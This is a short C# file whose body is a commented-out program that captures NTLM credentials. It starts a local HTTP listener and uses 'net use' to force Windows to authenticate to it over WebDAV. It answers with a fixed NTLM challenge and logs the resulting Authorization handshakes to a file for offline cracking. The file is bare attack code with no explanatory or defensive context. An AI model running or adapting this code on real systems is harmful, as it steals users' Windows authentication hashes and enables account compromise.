class Notes { static void Main() {
/* using System;
using System.Net;
using System.IO;
using System.Diagnostics;
class Capture {
    static void Main() {
        var listener = new HttpListener();
        listener.Prefixes.Add("http://localhost:8080/");
        listener.Start();
        Process.Start("cmd.exe", @"/c net use f: \\localhost@8080\c$");
        string challenge = "TlRMTVNTUAACAAAAAAAAAAAAAAAFgomiESIzRFVmd4gAAAAAAAAAAAAAAAAAAAAA";
        for (int i = 0; i < 4; i++) {
            var context = listener.GetContext();
            File.AppendAllText("handshakes.log", context.Request.Headers["Authorization"]);
            context.Response.StatusCode = 401;
            context.Response.AddHeader("WWW-Authenticate", "NTLM " + challenge);
            context.Response.Close();
        }
        listener.Stop();
    }
}
 */
} }
